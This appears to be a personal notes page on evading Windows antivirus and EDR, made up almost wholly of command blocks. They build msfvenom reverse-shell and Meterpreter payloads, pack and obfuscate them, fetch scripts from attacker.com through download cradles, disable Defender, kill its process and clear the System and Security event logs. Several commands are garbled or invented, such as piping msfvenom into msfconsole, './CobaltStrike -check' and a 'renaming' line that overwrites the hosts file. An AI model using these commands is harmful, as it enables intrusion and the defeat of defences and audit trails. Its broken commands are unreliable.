---
layout: notes
permalink: /notes/windows/av/
title: Windows AV/EDR Evasion
---

# Windows AV/EDR Evasion

## Bypassing Techniques
```powershell
# Generate obfuscated payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker> LPORT=4444 -e x86/shikata_ga_nai -f exe -o payload.exe

# Encrypt payload
Invoke-Aes -File payload.exe -Password "secret" -OutFile encrypted.exe

# Launch shellcode via msfconsole
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker> LPORT=4444 -f raw | msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/shell_reverse_tcp; set LHOST <attacker>; set LPORT 4444; exploit"

# Obfuscate with Veil
./Veil.py -p python/meterpreter/rev_tcp -o obfuscated.exe

# Obfuscate PowerShell script
Invoke-Obfuscation -Script payload.ps1
```

## Detection Avoidance
```powershell
# Disable real-time monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Clear system event log
wevtutil cl System

# Clear security event log
wevtutil cl Security

# Hide file by renaming
echo "Hidden" > c:\\windows\\system32\\drivers\\etc\\hosts

# Kill AV process
taskkill /IM MsMpEng.exe /F

# Disable Windows Defender via registry
reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

## Tool Obfuscation
```powershell
# Compress with UPX
upx --best payload.exe

# Obfuscate with TheFatRat
./TheFatRat -o obfuscated.exe

# Use Shellter to pack
shellter -f payload.exe

# Obfuscate PowerShell download
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1') | Invoke-Obfuscation

# Create encoded cradle
Invoke-CradleCrafter -Payload "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com')"
```

## Testing Evasion
```powershell
# Test payload execution
Invoke-Expression (Get-Content payload.exe -Raw) | Out-Null

# Check evasion with CobaltStrike
./CobaltStrike -check

# Submit to VirusTotal
curl -X POST --url 'https://www.virustotal.com/vtapi/v2/file/scan' --form "file=@payload.exe"

# Test in sandbox
Test-Sandbox -Payload payload.exe

# Analyze with any.run
any.run -f payload.exe
```

## Tools
- Veil Framework: ```./Veil.py```
- UPX: ```upx --best <file>```
- Invoke-Obfuscation: ```Invoke-Obfuscation -Script script.ps1```
- TheFatRat: ```./fatrat```
- Shellter: ```shellter -f payload.exe```
- Invoke-CradleCrafter: ```Invoke-CradleCrafter -Payload <script>```
- any.run: ```any.run -f <file>```